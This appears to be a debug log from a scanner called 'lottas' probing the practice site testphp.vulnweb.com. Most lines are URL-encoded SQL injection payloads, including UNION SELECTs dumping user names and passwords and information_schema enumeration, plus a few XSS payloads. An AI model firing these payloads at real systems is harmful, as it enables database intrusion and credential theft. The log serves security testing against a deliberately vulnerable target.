[2022-08-31][14:49:46][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][14:49:46][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C%40%40version%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C%40%40version%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1--dbs%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1--dbs%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+12%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2CEVENT_CATALOG+from+information_schema.EVENTS%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2CEVENT_CATALOG+from+information_schema.EVENTS%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=999999.9%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=999999.9%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%5Edatabase%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%5Edatabase%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28uname%2C0x3a%2Cpass%29+from+acuart.users+--%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28uname%2C0x3a%2Cpass%29+from+acuart.users+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=123%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=123%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Ctable_name+from+information_schema.tables%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Ctable_name+from+information_schema.tables%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-9999+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Cpass%2C8%2C9%2C10%2C11+FROM+users%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-9999+UNION+SELECT+1%2C2%2C3%2C4%2C5%2C6%2Cpass%2C8%2C9%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%9D%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%E2%80%9D%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+12--+%27123 | Warning.*?\Wmysqli?_
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+12--+%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:47][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:47][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=3%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=3%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29--%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2C2%2C3%2C4+from+information_schema.tables--+-%27123 | Warning.*?\Wmysqli?_
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+AND+1%3D1+UNION+ALL+SELECT+1%2C2%2C3%2C4+from+information_schema.tables--+-%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2C%40%40version%2C%27vuln3%27%2C%27vuln4%27%2C%27vuln5%27%2C%27vuln6%27%2C%27vuln7%27%2C%27vuln8%27%2C%27vuln9%27%2C%27vuln10%27%2C%27vuln11%27%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2C%40%40version%2C%27vuln3%27%2C%27vuln4%27%2C%27vuln5%27%2C%27vuln6%27%2C%27vuln7%27%2C%27vuln8%27%2C%27vuln9%27%2C%27vuln10%27%2C%27vuln11%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=123%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=123%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%27%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%3CscRipT%3Econfirm%281%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert%28%22Anmol%22%29%3C%2Fscript%3E%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%3E%3Cscript%3Ealert%28%22Anmol%22%29%3C%2Fscript%3E%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28CHARACTER_SET_NAME%29+from+information_schema%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28CHARACTER_SET_NAME%29+from+information_schema%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28CHARACTER_SET_NAME%2C0x3a%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28CHARACTER_SET_NAME%2C0x3a%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+--%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+11+--%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+11+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%60%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%60%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=4%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=4%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28table_name%29+from+information_schema.tables+where+table_schema%3D%27acuart%27+--%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28table_name%29+from+information_schema.tables+where+table_schema%3D%27acuart%27+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%22%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%22%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-999999++UNION+SELECT+1%2Cuname%2C3%2C4%2C5%2C6%2Cversion%28%29%2C8%2Cpass%2C10%2C11+FROM+users%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28column_name%29+from+information_schema%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28column_name%29+from+information_schema%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29+--%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2%27%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28table_name%29+from+information_schema.tables%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cgroup_concat%28table_name%29+from+information_schema.tables%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27+--%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C+group_concat%28column_name%29+from+information_schema.columns+where+table_name%3D%27users%27+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2Cgroup_concat%28colu%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2Cgroup_concat%28colu%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:48][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=%24%7Binjection%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:48][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%24%7Binjection%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:49][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2Cdatabase%28%29%2C%27vul%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:49][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2Cdatabase%28%29%2C%27vul%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:49][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1*%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:49][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1*%27123", "SQL syntax.*?MySQL"))
[2022-08-31][14:49:49][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+2%27123 | SQL syntax.*?MySQL
[2022-08-31][14:49:49][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+2%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:13:30][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][16:13:30][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][16:14:03][lottas][DEBUG] INIT THE Lottas Config
[2022-08-31][16:14:03][lottas::core::utils::files][DEBUG] READING "scripts/active/sqlierrors.lua"
[2022-08-31][16:14:04][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+--%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:04][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:04][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:04][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:04][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29+--%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:04][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2Cdatabase%28%29+--%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:04][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:04][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:04][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=4%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:04][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=4%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:04][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+12--+%27123 | Warning.*?\Wmysqli?_
[2022-08-31][16:14:04][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2+order+by+12--+%27123", "Warning.*?\\Wmysqli?_"))
[2022-08-31][16:14:04][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%22%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:04][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=FUZZ%22%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:04][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2%27%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:04][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:04][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=123%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:04][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=123%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C%40%40version%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C%40%40version%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1--dbs%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1--dbs%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=%24%7Binjection%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%24%7Binjection%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2Cdatabase%28%29%2C%27vul%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2Cdatabase%28%29%2C%27vul%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+order+by+1%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=2%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=2%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2C%40%40version%2C%27vuln3%27%2C%27vuln4%27%2C%27vuln5%27%2C%27vuln6%27%2C%27vuln7%27%2C%27vuln8%27%2C%27vuln9%27%2C%27vuln10%27%2C%27vuln11%27%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1+union+select+%27vuln1%27%2C%40%40version%2C%27vuln3%27%2C%27vuln4%27%2C%27vuln5%27%2C%27vuln6%27%2C%27vuln7%27%2C%27vuln8%27%2C%27vuln9%27%2C%27vuln10%27%2C%27vuln11%27%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=1%5Edatabase%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=1%5Edatabase%27123", "SQL syntax.*?MySQL"))
[2022-08-31][16:14:05][lottas::core][DEBUG] NOT SQLI FOUND:  http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2Cgroup_concat%28colu%27123 | SQL syntax.*?MySQL
[2022-08-31][16:14:05][lottas::core][DEBUG] HACKER MAN : Ok(("http://testphp.vulnweb.com/listproducts.php?cat=-1+union+select+1%2Cgroup_concat%28colu%27123", "SQL syntax.*?MySQL"))
